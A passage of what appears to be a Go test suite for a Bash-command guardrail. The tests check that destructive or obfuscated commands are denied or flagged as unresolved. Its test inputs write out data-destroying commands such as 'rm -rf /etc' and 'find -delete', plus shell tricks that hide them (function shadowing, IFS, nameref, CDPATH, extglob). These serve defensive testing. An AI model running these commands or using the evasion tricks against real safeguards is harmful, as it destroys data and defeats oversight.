			t.Errorf("checkBash(%q) = %+v, want allow", command, verdict)
		}
	}
}

// Mutation caught: looking up the original wrapper before applying call assignments can hide them from the function or leak them to the caller.
func TestNF19ShadowedWrapperPrefixAssignmentsAreScoped(t *testing.T) {
	command := `command(){ rm -rf "$TARGET/body"; }; TARGET=/etc; TARGET=/repo/safe command; rm -rf "$TARGET/caller"`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	if !hasArgv(got, []string{"rm", "-rf", "/repo/safe/body"}) {
		t.Fatalf("shadowed wrapper body did not see prefix assignment: %+v", got)
	}
	if !hasArgv(got, []string{"rm", "-rf", "/etc/caller"}) {
		t.Fatalf("caller did not regain prior assignment: %+v", got)
	}
}

// Mutation caught: exact break/continue execution omits a syntactic body tail and can hide a destructive policy candidate.
func TestNF19PlainLoopControlCannotHideBodyTail(t *testing.T) {
	for _, control := range []string{"break", "continue"} {
		command := fmt.Sprintf(`for n in one two; do %s; rm -rf /etc/$n; done`, control)
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		want := [][]string{
			{control}, {"rm", "-rf", "/etc/one"},
			{control}, {"rm", "-rf", "/etc/two"}, nil,
		}
		if !reflect.DeepEqual(argvs(got), want) {
			t.Errorf("Normalize(%q) argv = %v, want complete per-item candidates %v", command, argvs(got), want)
		}
		if !got[len(got)-1].Unresolved {
			t.Errorf("Normalize(%q) last = %+v, want unresolved control-state sentinel", command, got[len(got)-1])
		}
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
			t.Errorf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
		}
	}
}

// Mutation caught: recognizing builtin/command wrappers as exact loop control omits the remaining syntactic body candidates.
func TestNF19WrappedLoopControlCannotHideBodyTail(t *testing.T) {
	for _, wrapper := range []string{"builtin", "command"} {
		command := fmt.Sprintf(`for n in one two; do %s break; rm -rf /etc/$n; done`, wrapper)
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		want := [][]string{
			{"break"}, {"rm", "-rf", "/etc/one"},
			{"break"}, {"rm", "-rf", "/etc/two"}, nil,
		}
		if !reflect.DeepEqual(argvs(got), want) {
			t.Errorf("Normalize(%q) argv = %v, want complete wrapped-control candidates %v", command, argvs(got), want)
		}
		if !got[len(got)-1].Unresolved {
			t.Errorf("Normalize(%q) last = %+v, want unresolved control-state sentinel", command, got[len(got)-1])
		}
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
			t.Errorf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
		}
	}
}

// Mutation caught: falling back to one unresolved body walk for shadowed or body-mutated controls loses concrete per-item candidates.
func TestNF19FunctionMutatedControlCannotHideBodyTail(t *testing.T) {
	for _, command := range []string{
		`break(){ :; }; for n in one two; do break; rm -rf /etc/$n; done`,
		`command(){ :; }; for n in one two; do command break; rm -rf /etc/$n; done`,
		`for n in one two; do continue(){ :; }; continue; rm -rf /etc/$n; done`,
		`define(){ continue(){ :; }; }; for n in one two; do define; continue; rm -rf /etc/$n; done`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		if !hasArgv(got, []string{"rm", "-rf", "/etc/one"}) || !hasArgv(got, []string{"rm", "-rf", "/etc/two"}) {
			t.Errorf("Normalize(%q) argv = %v, want both concrete destructive tails", command, argvs(got))
		}
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
			t.Errorf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
		}
	}
}

// Mutation caught: compensating control-flow degradation erases a genuine PWD assignment before continue.
func TestNF19CrossIterationPWDMutationBeforeControlFailsClosed(t *testing.T) {
	command := `for n in one two; do rm -rf "$PWD/guardrail-test"; PWD=/etc; continue; done`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	want := [][]string{
		{"rm", "-rf", "/repo/guardrail-test"}, {"continue"},
		{"rm", "-rf", "/repo/guardrail-test"}, {"continue"}, nil,
	}
	if !reflect.DeepEqual(argvs(got), want) {
		t.Fatalf("Normalize(%q) argv = %v, want concrete body candidates plus unresolved sentinel %v", command, argvs(got), want)
	}
	if !got[len(got)-1].Unresolved {
		t.Fatalf("Normalize(%q) last = %+v, want unresolved cross-item PWD mutation sentinel", command, got[len(got)-1])
	}
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: restarting every item from the original function map can miss a destructive redefinition used by a later item.
func TestNF19CrossIterationFunctionMutationFailsClosed(t *testing.T) {
	command := `mutate(){ mutate(){ rm -rf /etc; }; }; for n in one two; do mutate; done`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved for cross-item function mutation", command, verdict)
	}
}

// Mutation caught: discarding candidate variable outcomes reuses a safe initial target after the body changes it.
func TestNF19CrossIterationScalarMutationFailsClosed(t *testing.T) {
	command := `TARGET=/repo/safe; for n in one two; do rm -rf "$TARGET"; TARGET=/etc; done`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved for cross-item scalar mutation", command, verdict)
	}
}

// Mutation caught: discarding candidate cwd outcomes resolves every iteration against the original PWD.
func TestNF19CrossIterationCWDMutationFailsClosed(t *testing.T) {
	command := `for n in one two; do rm -rf "$PWD/guardrail-test"; cd /etc; done`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved for cross-item cwd mutation", command, verdict)
	}
}

// Mutation caught: discarding declaration effects treats a later nameref iteration as an ordinary scalar.
func TestNF19CrossIterationDeclarationMutationFailsClosed(t *testing.T) {
	command := `TARGET=/repo/safe; ACTUAL=/etc; for n in one two; do rm -rf "$TARGET"; declare -n TARGET=ACTUAL; done`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved for cross-item declaration mutation", command, verdict)
	}
}

// Mutation caught: replacing concrete candidates with a state sentinel can soften a literal deny.
func TestNF19CrossIterationSentinelPreservesLiteralDeny(t *testing.T) {
	command := `TARGET=/repo/safe; for n in one two; do rm -rf /etc; TARGET=/etc; done`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("checkBash(%q) = %+v, want deny/P1.rm-rf from concrete candidate", command, verdict)
	}
}

// Mutation caught: treating ordinary external-command filesystem uncertainty as shell-state change defeats audited finite loops.
func TestNF19StateInertAuditedLoopRemainsConcrete(t *testing.T) {
	command := `SK=/repo/tools; PLAN=docs/plan.md; for n in 2 3 4; do "$SK/task-brief" "$PLAN" $n; done`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	want := [][]string{
		{"/repo/tools/task-brief", "docs/plan.md", "2"},
		{"/repo/tools/task-brief", "docs/plan.md", "3"},
		{"/repo/tools/task-brief", "docs/plan.md", "4"},
	}
	if !reflect.DeepEqual(argvs(got), want) {
		t.Fatalf("Normalize(%q) argv = %v, want audited candidates %v", command, argvs(got), want)
	}
	for index, simple := range got {
		if simple.Unresolved {
			t.Errorf("candidate %d = %+v, want concrete", index, simple)
		}
	}
	if verdict := evalBash(t, command); verdict != nil {
		t.Fatalf("checkBash(%q) = %+v, want allow", command, verdict)
	}
}

// Mutation caught: ignoring filesystem uncertainty when find consumes it treats every deletion pass as the first.
func TestNF19CrossIterationFilesystemMutationBeforeFindFailsClosed(t *testing.T) {
	root := t.TempDir()
	command := fmt.Sprintf(`for n in one two; do find %q -mindepth 1 -delete; done`, root)
	verdict := checkBash(
		ToolCall{Tool: "Bash", Command: command, CWD: "/repo", RepoRoot: "/repo"},
		&policy.Policy{Slots: policy.Slots{SafeRoots: []string{root}}, Waived: map[string]bool{}},
	)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved for cross-item filesystem mutation before find", command, verdict)
	}
}

// Mutation caught: treating every find as a filesystem-sensitive destructive operation over-broadens the sentinel.
func TestNF19CrossIterationReadOnlyFindRemainsConcrete(t *testing.T) {
	root := t.TempDir()
	command := fmt.Sprintf(`for n in one two; do find %q -maxdepth 1; done`, root)
	verdict := checkBash(
		ToolCall{Tool: "Bash", Command: command, CWD: "/repo", RepoRoot: "/repo"},
		&policy.Policy{Slots: policy.Slots{SafeRoots: []string{root}}, Waived: map[string]bool{}},
	)
	if verdict != nil {
		t.Fatalf("checkBash(%q) = %+v, want allow for read-only find", command, verdict)
	}
}

// Mutation caught: publishing enumerated iterator, variable, cwd, or status invents an exact post-loop target.
func TestNF19PostLoopStateAndStatusRemainUnresolved(t *testing.T) {
	for _, command := range []string{
		`for TARGET in /repo/one /repo/two; do git add "$TARGET"; done; rm -rf "$TARGET"`,
		`TARGET=/repo/safe; for n in one; do TARGET=/etc; done; rm -rf "$TARGET"`,
		`for n in one; do cd /etc; done; rm -rf "$PWD/guardrail-test"`,
		`TARGET=/repo/safe; for n in one; do true; done && TARGET=/etc; rm -rf $TARGET`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}

	command := `for n in one; do true; done && TARGET=/repo/safe; rm -rf /etc`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("checkBash(%q) = %+v, want independent literal deny/P1.rm-rf", command, verdict)
	}
}

// Mutation caught: accepting runtime-expanded or pathname-expanded loop lists invents a finite iterator history.
func TestNF19LeavesUnboundedLoopListsUnresolved(t *testing.T) {
	for _, command := range []string{
		`for n in $ITEMS; do rm -rf $n; done`,
		`for n; do rm -rf $n; done`,
		`for n in *; do rm -rf $n; done`,
		`for n in $(printf /etc); do rm -rf $n; done`,
		`for n in $((1)); do rm -rf $n; done`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

// Mutation caught: post-loop invalidation can make iterator-attribute tests pass even when the in-loop binding is wrongly treated as ordinary.
func TestNF19RejectsNonScalarIteratorBindings(t *testing.T) {
	for _, test := range []struct {
		name    string
		command string
	}{
		{name: "nameref", command: `ACTUAL=/repo/safe; declare -n TARGET=ACTUAL; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
		{name: "readonly", command: `readonly TARGET=/repo/safe; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
		{name: "lowercase", command: `declare -l TARGET=/repo/safe; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
		{name: "uppercase", command: `declare -u TARGET=/repo/safe; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
		{name: "array", command: `declare -a TARGET=/repo/safe; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
		{name: "integer", command: `declare -i TARGET=0; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
	} {
		t.Run(test.name, func(t *testing.T) {
			verdict := evalBash(t, test.command)
			if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
				t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved from in-loop operand", test.command, verdict)
			}
		})
	}
}

// Mutation caught: unwrapped or resolved declaration builtins can invalidate a value without recording non-ordinary assignment semantics.
func TestNF19RejectsWrappedAndResolvedDeclarationIterators(t *testing.T) {
	for _, test := range []struct {
		name    string
		command string
	}{
		{name: "wrapped-case-conversion", command: `command declare -l TARGET=/repo/safe; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
		{name: "wrapped-array", command: `command declare -a TARGET=/repo/safe; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
		{name: "wrapped-readonly", command: `builtin readonly TARGET=/repo/safe; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
		{name: "resolved-integer", command: `DECL=declare; $DECL -i TARGET=0; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
		{name: "resolved-readonly", command: `DECL=readonly; $DECL TARGET=/repo/safe; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
		{name: "resolved-unknown-flag", command: `FLAGS=-Z; command declare "$FLAGS" TARGET=/repo/safe; for TARGET in /repo/safe; do rm -rf "$TARGET"; done`},
	} {
		t.Run(test.name, func(t *testing.T) {
			verdict := evalBash(t, test.command)
			if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
				t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved from in-loop operand", test.command, verdict)
			}
		})
	}
}

// Mutation caught: persistent assignment publishes an untransformed scalar despite known assignment attributes.
func TestNF19AttributedPersistentAssignmentFailsClosed(t *testing.T) {
	command := `declare -u TARGET; TARGET=/repo/safe; rm -rf "$TARGET"`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: command-prefix assignment publishes an attributed value inside a function instead of restoring uncertainty.
func TestNF19AttributedPrefixAssignmentAndRestoreFailClosed(t *testing.T) {
	command := `declare -u TARGET; inspect(){ rm -rf "$TARGET/body"; }; TARGET=/repo/safe inspect; rm -rf "$TARGET/caller"`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	rmCount := 0
	for _, simple := range got {
		if head(simple.Argv) != "rm" {
			continue
		}
		rmCount++
		if !simple.wordUnresolved(2) {
			t.Errorf("Normalize(%q) rm = %+v, want attributed target unresolved", command, simple)
		}
	}
	if rmCount != 2 {
		t.Fatalf("Normalize(%q) = %+v, want function and restored-caller rm candidates", command, got)
	}
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: an unknown declaration transition is discarded when a later assignment republishes an exact value.
func TestNF19UnknownAttributeAssignmentFailsClosed(t *testing.T) {
	command := `FLAGS=-Z; command declare "$FLAGS" GIT_DIR; GIT_DIR=/repo/safe; git status`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if _, published := last.gitEnvironment["GIT_DIR"]; published || !last.gitEnvironmentUnknown || !last.Unresolved {
		t.Fatalf("Normalize(%q) last = %+v, want assignment after unknown attributes unpublished", command, last)
	}
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: successful cd publishes exact PWD despite unsupported PWD assignment attributes.
func TestNF19AttributedPWDPublicationFailsClosed(t *testing.T) {
	repo := t.TempDir()
	command := fmt.Sprintf(`declare -u PWD; cd %q; rm -rf "$PWD/guardrail-test"`, repo)
	verdict := checkBash(ToolCall{Tool: "Bash", Command: command, CWD: repo, RepoRoot: repo}, bashPol())
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: declaration invalidation leaves the separately tracked CDPATH exact after assigning it attributes.
func TestNF19AttributedCDPATHSearchFailsClosed(t *testing.T) {
	repo := t.TempDir()
	searchRoot := filepath.Join(repo, "search")
	if err := os.MkdirAll(filepath.Join(searchRoot, "target"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CDPATH", searchRoot)
	command := `declare -u CDPATH; cd target; rm -rf "$PWD/guardrail-test"`
	verdict := checkBash(ToolCall{Tool: "Bash", Command: command, CWD: repo, RepoRoot: repo}, bashPol())
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
	}
}

// Mutation caught: applying the attribute invariant to every assignment would discard ordinary exact scalar and PWD facts.
func TestNF19OrdinaryAssignmentsAndPWDRemainConcrete(t *testing.T) {
	command := `TARGET=/repo/safe; rm -rf "$TARGET"; cd /repo; rm -rf "$PWD/guardrail-test"`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	want := [][]string{
		{"rm", "-rf", "/repo/safe"},
		{"cd", "/repo"},
		{"rm", "-rf", "/repo/guardrail-test"},
	}
	if !reflect.DeepEqual(argvs(got), want) {
		t.Fatalf("Normalize(%q) argv = %v, want concrete commands %v", command, argvs(got), want)
	}
	for index, simple := range got {
		if simple.Unresolved {
			t.Errorf("Normalize(%q) candidate %d = %+v, want concrete", command, index, simple)
		}
	}
	if verdict := evalBash(t, command); verdict != nil {
		t.Fatalf("checkBash(%q) = %+v, want allow", command, verdict)
	}
}

// Mutation caught: dropping the attributed Ask candidate can let strongest-Verdict handling obscure a literal Deny regression.
func TestNF19AttributedAssignmentPreservesLiteralDeny(t *testing.T) {
	command := `declare -u TARGET; TARGET=/repo/safe; rm -rf "$TARGET"; rm -rf /etc`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
	}
}

// Mutation caught: Git environment extraction consumes an exact value that unsupported attributes would transform.
func TestNF19AttributedGitEnvironmentIsNotPublished(t *testing.T) {
	command := `declare -u GIT_DIR; GIT_DIR=/repo/safe; git status`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if _, published := last.gitEnvironment["GIT_DIR"]; published || !last.gitEnvironmentUnknown || !last.Unresolved {
		t.Fatalf("Normalize(%q) last = %+v, want unknown Git environment without attributed exact value", command, last)
	}
}

// Mutation caught: binding a static loop iterator only in variables leaves the CDPATH search mirror stale.
func TestNF19LoopBindingSynchronizesCDPATH(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, "etc"), 0o755); err != nil {
		t.Fatal(err)
	}
	command := `CDPATH=; for CDPATH in /; do cd etc; rm -rf "$PWD/guardrail-test"; done`
	got, err := Normalize(command, repo)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"rm", "-rf", "/etc/guardrail-test"}
	if !hasArgv(got, want) {
		t.Fatalf("Normalize(%q) = %+v, want runtime-reachable candidate %q", command, got, want)
	}
	verdict := checkBash(ToolCall{Tool: "Bash", Command: command, CWD: repo, RepoRoot: repo}, bashPol())
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("checkBash(%q) = %+v, want loop-bound CDPATH to reach deny/P1.rm-rf", command, verdict)
	}
}

// Mutation caught: treating every CDPATH loop binding as unknown loses a semantically safe concrete search result.
func TestNF19SafeLoopBoundCDPATHRemainsConcrete(t *testing.T) {
	repo := t.TempDir()
	searchRoot := filepath.Join(repo, "search")
	target := filepath.Join(searchRoot, "target")
	if err := os.MkdirAll(target, 0o755); err != nil {
		t.Fatal(err)
	}
	command := fmt.Sprintf(`CDPATH=; for CDPATH in %q; do cd target; rm -rf "$PWD/guardrail-test"; done`, searchRoot)
	got, err := Normalize(command, repo)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"rm", "-rf", filepath.Join(target, "guardrail-test")}
	if last := got[len(got)-1]; !reflect.DeepEqual(last.Argv, want) || last.Unresolved {
		t.Fatalf("Normalize(%q) last = %+v, want concrete %q", command, last, want)
	}
	if verdict := checkBash(ToolCall{Tool: "Bash", Command: command, CWD: repo, RepoRoot: repo}, bashPol()); verdict != nil {
		t.Fatalf("checkBash(%q) = %+v, want allow", command, verdict)
	}
}

// Mutation caught: synchronizing only CDPATH leaves other special loop bindings inconsistent with exact assignment.
func TestNF19LoopBindingSynchronizesIFSAndGitFacts(t *testing.T) {
	ifsCommand := `for IFS in :; do S="safe:/etc"; rm -rf $S; done`
	verdict := evalBash(t, ifsCommand)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", ifsCommand, verdict)
	}

	gitCommand := `for GIT_DIR in /repo/safe/.git; do git status; done`
	got, err := Normalize(gitCommand, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last := got[len(got)-1]
	if last.gitEnvironment["GIT_DIR"] != "/repo/safe/.git" || last.gitEnvironmentUnknown || last.Unresolved {
		t.Fatalf("Normalize(%q) last = %+v, want exact loop-bound Git environment", gitCommand, last)
	}

	unknownCommand := `printf -v GIT_DIR /tmp/unknown; for GIT_DIR in /repo/safe/.git; do git status; done`
	got, err = Normalize(unknownCommand, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	last = got[len(got)-1]
	if !last.gitEnvironmentUnknown || !last.Unresolved {
		t.Fatalf("Normalize(%q) last = %+v, want prior Git uncertainty preserved", unknownCommand, last)
	}
}

// Mutation caught: bulk value loss without IFS invalidation assumes default splitting after custom IFS was discarded.
func TestNF19BulkValueLossInvalidatesIFS(t *testing.T) {
	cases := map[string]string{
		"let builtin":  `IFS=:; let x=1; S="safe:/etc"; rm -rf $S`,
		"arithmetic":   `IFS=:; ((x=1)); S="safe:/etc"; rm -rf $S`,
		"C-style loop": `IFS=:; for ((i=0; i<1; i++)); do :; done; S="safe:/etc"; rm -rf $S`,
	}
	for name, command := range cases {
		t.Run(name, func(t *testing.T) {
			verdict := evalBash(t, command)
			if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
				t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
			}
		})
	}
}

// Mutation caught: treating known default IFS as unknown without a value-loss transition rejects an ordinary safe scalar.
func TestNF19DefaultIFSControlRemainsConcrete(t *testing.T) {
	command := `S=safe; rm -rf $S`
	got, err := Normalize(command, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"rm", "-rf", "safe"}
	if len(got) != 1 || !reflect.DeepEqual(got[0].Argv, want) || got[0].Unresolved {
		t.Fatalf("Normalize(%q) = %+v, want concrete %q", command, got, want)
	}
	if verdict := evalBash(t, command); verdict != nil {
		t.Fatalf("checkBash(%q) = %+v, want allow", command, verdict)
	}
}

// Mutation caught: direct all-value loss outside arithmetic bypasses the special-variable invalidation seam.
func TestNF19AdditionalBulkValueLossRoutesInvalidateIFS(t *testing.T) {
	cases := map[string]string{
		"nested shell expansion scope": `IFS=:; bash -c 'S="safe:/etc"; rm -rf $S'`,
		"cyclic nameref assignment":    `declare -n A=B; declare -n B=A; IFS=:; A=value; S="safe:/etc"; rm -rf $S`,
		"invalid nameref declaration":  `IFS=:; declare -n REF=not-valid; S="safe:/etc"; rm -rf $S`,
		"cyclic nameref invalidation":  `declare -n A=B; declare -n B=A; IFS=:; unset A; S="safe:/etc"; rm -rf $S`,
	}
	for name, command := range cases {
		t.Run(name, func(t *testing.T) {
			verdict := evalBash(t, command)
			if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
				t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
			}
		})
	}
}

// Mutation caught: recognizing only ordinary glob metacharacters publishes extglob-capable tracked values as one field.
func TestNF19UnquotedTrackedExtglobValuesFailClosed(t *testing.T) {
	for _, value := range []string{"@(safe|etc)", "+(safe|etc)", "!(safe)"} {
		command := fmt.Sprintf("S=%q; rm -rf $S", value)
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

// Mutation caught: applying unquoted extglob restrictions inside quotes or to ordinary safe values loses concrete fields.
func TestNF19QuotedExtglobAndOrdinaryValuesRemainConcrete(t *testing.T) {
	for _, command := range []string{
		`S='@(safe|etc)'; rm -rf "$S"`,
		`S=safe; rm -rf $S`,
	} {
		if verdict := evalBash(t, command); verdict != nil {
			t.Errorf("checkBash(%q) = %+v, want allow", command, verdict)
		}
	}
}

// Mutation caught: an unresolved state-seam candidate must not outrank or erase an independent literal Deny.
func TestNF19StateSeamUncertaintyPreservesLiteralDeny(t *testing.T) {
	command := `S='@(safe|etc)'; rm -rf $S; rm -rf /etc`
	verdict := evalBash(t, command)
	if verdict == nil || verdict.Decision != policy.Deny || verdict.RuleID != "P1.rm-rf" {
		t.Fatalf("checkBash(%q) = %+v, want deny/P1.rm-rf", command, verdict)
	}
}

// Mutation caught: a real extglob-enabled shell can expand these prior-literal values into runtime path fields.
func TestNF19BashExtglobSemanticFixture(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash is not installed")
	}
	dir := t.TempDir()
	for _, name := range []string{"safe", "etc"} {
		if err := os.WriteFile(filepath.Join(dir, name), nil, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	cases := map[string]string{
		"@(safe|etc)": "etc\nsafe",
		"+(safe|etc)": "etc\nsafe",
		"!(safe)":     "etc",
	}
	for value, want := range cases {
		command := exec.Command(bash, "-O", "extglob", "-c", fmt.Sprintf("S=%q; printf '%%s\\n' $S", value))
		command.Dir = dir
		output, err := command.CombinedOutput()
		if err != nil {
			t.Fatalf("bash extglob probe for %q: %v: %s", value, err, output)
		}
		if got := strings.TrimSpace(string(output)); got != want {
			t.Fatalf("bash extglob probe for %q = %q, want %q", value, got, want)
		}
	}
}

// Mutation caught: consolidating exact publication without mirror-aware restoration breaks safe prefix scoping.
func TestNF19SpecialVariablePrefixRestorationRemainsConcrete(t *testing.T) {
	repo := t.TempDir()
	searchRoot := filepath.Join(repo, "search")
	target := filepath.Join(searchRoot, "target")
	if err := os.MkdirAll(target, 0o755); err != nil {
		t.Fatal(err)
	}
	command := fmt.Sprintf(`CDPATH=%q; noop(){ :; }; CDPATH=/ noop; cd target; rm -rf "$PWD/guardrail-test"`, searchRoot)
	got, err := Normalize(command, repo)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"rm", "-rf", filepath.Join(target, "guardrail-test")}
	if last := got[len(got)-1]; !reflect.DeepEqual(last.Argv, want) || last.Unresolved {
		t.Fatalf("Normalize(%q) last = %+v, want restored CDPATH command %q", command, last, want)
	}
	if verdict := evalBash(t, `S=safe; noop(){ :; }; IFS=: noop; rm -rf $S`); verdict != nil {
		t.Fatalf("default IFS after prefix restoration = %+v, want allow", verdict)
	}
}

// Mutation caught: comparing merged-away IFS against later arms misses custom-versus-absent state in first-arm order.
func TestNF19MergeDetectsIFSPresenceSymmetrically(t *testing.T) {
	for _, command := range []string{
		`if [ -e /runtime-choice ]; then IFS=:; else :; fi; S="safe:/etc"; rm -rf $S`,
		`if [ -e /runtime-choice ]; then :; else IFS=:; fi; S="safe:/etc"; rm -rf $S`,
	} {
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
			t.Errorf("checkBash(%q) = %+v, want ask/P3.unresolved", command, verdict)
		}
	}
}

// Mutation caught: merge either overlooks differing known IFS values or discards an identical known value.
func TestNF19MergeComparesKnownIFSValues(t *testing.T) {
	different := `if [ -e /runtime-choice ]; then IFS=:; else IFS=/; fi; S="safe:/etc"; rm -rf $S`
	verdict := evalBash(t, different)
	if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
		t.Fatalf("checkBash(%q) = %+v, want ask/P3.unresolved", different, verdict)
	}

	identical := `if [ -e /runtime-choice ]; then IFS=:; else IFS=:; fi; S=/repo/safe; rm -rf $S`
	got, err := Normalize(identical, "/repo")
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"rm", "-rf", "/repo/safe"}
	if last := got[len(got)-1]; !reflect.DeepEqual(last.Argv, want) || last.Unresolved {
		t.Fatalf("Normalize(%q) last = %+v, want concrete %q", identical, last, want)
	}
	if verdict := evalBash(t, identical); verdict != nil {
		t.Fatalf("checkBash(%q) = %+v, want allow", identical, verdict)
	}
}

// Mutation caught: commonVariables drops differing or branch-absent Git values without marking repository state unknown.
func TestNF19MergeDetectsGitEnvironmentDifferences(t *testing.T) {
	for _, command := range []string{
		`if [ -e /runtime-choice ]; then GIT_DIR=/repo/safe; else GIT_DIR=/etc; fi; git status`,
		`if [ -e /runtime-choice ]; then GIT_DIR=/repo/safe; else :; fi; git status`,
		`if [ -e /runtime-choice ]; then :; else GIT_DIR=/repo/safe; fi; git status`,
	} {
		got, err := Normalize(command, "/repo")
		if err != nil {
			t.Fatal(err)
		}
		last := got[len(got)-1]
		if !last.gitEnvironmentUnknown || !last.Unresolved {
			t.Errorf("Normalize(%q) last = %+v, want unknown merged Git environment", command, last)
		}
		verdict := evalBash(t, command)
		if verdict == nil || verdict.Decision != policy.Ask || verdict.RuleID != "P3.unresolved" {
